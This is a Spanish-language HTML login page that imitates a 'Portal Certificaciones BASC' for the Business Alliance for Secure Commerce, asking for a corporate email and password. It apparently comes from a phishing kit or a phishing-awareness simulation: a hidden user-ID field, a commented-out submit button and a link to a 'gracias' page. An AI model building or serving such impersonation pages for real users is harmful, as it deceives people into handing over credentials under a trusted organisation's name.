<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Portal Certificaciones BASC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;color:#333;}
    .card{max-width:380px;margin:60px auto;background:#fff;border-radius:8px;box-shadow:0 4px 14px rgba(0,0,0,.1);padding:40px;}
    h2{text-align:center;color:#003366;margin-top:0;}
    label{display:block;margin:18px 0 6px;font-weight:600;}
    input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:15px;}
    .btn{margin-top:26px;background:#0074c1;color:#fff;border:none;width:100%;padding:14px;border-radius:4px;font-size:16px;cursor:pointer;}
    .btn:hover{opacity:.85;}
    .logo{display:block;margin:0 auto 25px;width:160px;}
    .note{font-size:12px;color:#777;text-align:center;margin-top:25px;}
  </style>
</head>
<body>
  <div class="card">
    <img class="logo" src="imagenes\logo-basc.png" alt="BASC">
    <h2>Ingreso al Portal BASC</h2>
    <form method="POST" action="/submit">
      <input type="hidden" name="userId" value="">
      <label for="username">Correo corporativo</label>
      <input type="email" id="username" name="username" placeholder="usuario@empresa.com" required>
      <label for="password">Contraseña</label>
      <input type="password" id="password" name="password" placeholder="********" required>
      <!--button type="submit" class="btn">Iniciar sesión</button-->
      <p style="margin:30px 0;text-align:center;">
        <!-- Botón -->
        <a href="gracias.html" target="_blank"
           class="btn"
           style="background:#0074c1;color:#ffffff;text-decoration:none;padding:14px 14px;border-radius:4px;font-weight:bold;display:inline-block;">
           Iniciar sesión
        </a>
      </p>
    </form>
    <p class="note">© 2025 Business Alliance for Secure Commerce</p>
  </div>
</body>
</html>
